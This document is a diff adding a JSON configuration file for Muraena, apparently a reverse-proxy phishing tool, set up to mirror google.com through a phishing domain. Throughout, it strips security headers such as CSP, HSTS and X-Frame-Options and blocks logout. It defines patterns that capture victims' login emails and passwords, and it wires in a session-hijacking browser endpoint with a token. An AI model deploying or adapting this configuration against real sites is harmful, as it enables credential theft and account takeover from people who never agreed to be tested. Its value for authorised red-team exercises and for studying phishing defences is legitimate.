@@ -1,0 +1,143 @@
+{
+  "proxy": {
+    "phishing": "test.muraena",
+    "destination": "google.com",
+
+    "listener": {
+      "ip": "0.0.0.0",
+      "port": 8443,
+      "portmapping": "8443:443",
+      "HTTPtoHTTPS": {
+        "enabled": true,
+        "HTTPport": 8080
+      }
+    },
+
+    "skipContentType": [
+      "font/*",
+      "image/*"
+    ],
+    "transform": {
+      "base64": {
+        "enabled": true,
+        "padding": [
+          "=",
+          "."
+        ]
+      },
+      "request": {
+        "header": [
+          "Cookie",
+          "Referer",
+          "Origin",
+          "X-Forwarded-For"
+        ]
+      },
+      "response": {
+        "header": [
+          "Location",
+          "WWW-Authenticate",
+          "Origin",
+          "Set-Cookie",
+          "Access-Control-Allow-Origin"
+        ],
+        "custom": [
+          [
+            "old-value",
+            "new-value"
+          ]
+        ]
+      }
+    },
+    "remove": {
+      "request": {
+        "header": [
+          "X-Forwarded-For"
+        ]
+      },
+      "response": {
+        "header": [
+          "Content-Security-Policy",
+          "Content-Security-Policy-Report-Only",
+          "Strict-Transport-Security",
+          "X-XSS-Protection",
+          "X-Content-Type-Options",
+          "X-Frame-Options",
+          "Referrer-Policy",
+          "X-Forwarded-For"
+        ]
+      }
+    },
+    "drop": [
+      {
+        "url": "/logout",
+        "redirectTo": "https://example.com"
+      }
+    ],
+    "log": {
+      "enabled": true,
+      "filePath": "muraena.log"
+    }
+  },
+  "tls": {
+    "enabled": true,
+    "expand": false,
+    "certificate": "./config/cert.pem",
+    "key": "./config/privkey.pem",
+    "root": "./config/fullchain.pem"
+  },
+  "crawler": {
+    "enabled": false,
+    "depth": 2,
+    "upto": 20,
+    "externalOriginPrefix": "muraena-",
+    "externalOrigins": []
+  },
+  "necrobrowser": {
+    "enabled": false,
+    "endpoint": "http://127.0.0.1:8080",
+    "token": "ada9f7b8-6e6c-4884-b2a3-ea757c1eb617",
+    "profile": "example",
+    "keywords": null
+  },
+  "staticServer": {
+    "enabled": false,
+    "port": 8080,
+    "localPath": "./static/",
+    "urlPath": "/evilpath/"
+  },
+  "tracking": {
+    "enabled": true,
+    "type": "",
+    "identifier": "_gat",
+    "domain": "",
+    "ipSource": "",
+    "regex": "[a-zA-Z0-9]{5}",
+    "urls": {
+      "credentials": [
+        "/credentials_path"
+      ],
+      "authSession": [
+        "/auth_session_path"
+      ]
+    },
+    "params": [
+      "login_email",
+      "login_password"
+    ],
+    "patterns": [
+      {
+        "label": "Username",
+        "matching": "login_email",
+        "start": "login_email=",
+        "end": "\u0026"
+      },
+      {
+        "label": "Password",
+        "matching": "login_password",
+        "start": "\u0026login_password=",
+        "end": "\u0026"
+      }
+    ]
+  }
+}
